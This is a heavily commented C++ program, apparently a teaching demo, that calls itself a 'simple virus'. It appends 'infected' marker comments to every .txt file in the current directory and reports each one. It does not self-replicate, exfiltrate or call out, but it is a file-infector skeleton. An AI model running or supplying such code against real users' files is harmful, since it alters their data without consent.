#include <iostream>  // Include the standard input-output stream library for console operations
#include <fstream>   // Include the file stream library to handle file input and output
#include <string>    // Include the string library to work with string data
#include <filesystem> // Include the filesystem library to interact with the file system (e.g., iterating through directories)

// Function to execute the payload on a specified file
void payloadAction(const std::string& fileName) {
    // Define the payload: a string that will be appended to the file to indicate it has been "infected"
    std::string payload = "\n// This file has been infected!\n";
    
    // Create a file stream object to manage the file
    std::fstream file;
    file.open(fileName, std::ios::app);  // Open the file in append mode, allowing us to add data to the end without overwriting existing content
    
    // Check if the file was successfully opened
    if (file.is_open()) {
        file << payload;  // Append the payload to the file
        file.close();  // Close the file to save the changes and free system resources
        std::cout << "Payload delivered to: " << fileName << std::endl;  // Output a message indicating the payload was successfully delivered
    }
}

// Function to find and infect .txt files in the current directory
void infectFiles() {
    // Define the virus code: this is the string that will be inserted into the files to indicate infection
    std::string virusCode = "\n// Infected by a simple C++ virus\n";
    
    // Loop through all files in the current directory using a directory iterator
    for (const auto& entry : std::filesystem::directory_iterator(".")) {
        // Check if the current file has a .txt extension (i.e., it's a text file)
        if (entry.path().extension() == ".txt") {
            // Convert the file path to a string, so it can be used for file operations
            std::string fileName = entry.path().string();
            
            // Create a file stream object to open and modify the file
            std::fstream file;
            file.open(fileName, std::ios::app);  // Open the file in append mode
            
            // Check if the file was successfully opened
            if (file.is_open()) {
                file << virusCode;  // Append the virus code to the file
                file.close();  // Close the file to save the changes
                payloadAction(fileName);  // Call the payloadAction function to append the payload to the file
                std::cout << "Infected: " << fileName << std::endl;  // Output a message indicating the file was successfully infected
            } else {
                std::cout << "Failed to infect: " << fileName << std::endl;  // Output an error message if the file could not be opened
            }
        }
    }
}

// Main function: the entry point of the program
int main() {
    infectFiles();  // Call the infectFiles function to start the infection process
    return 0;  // Return 0 to indicate that the program finished successfully
}
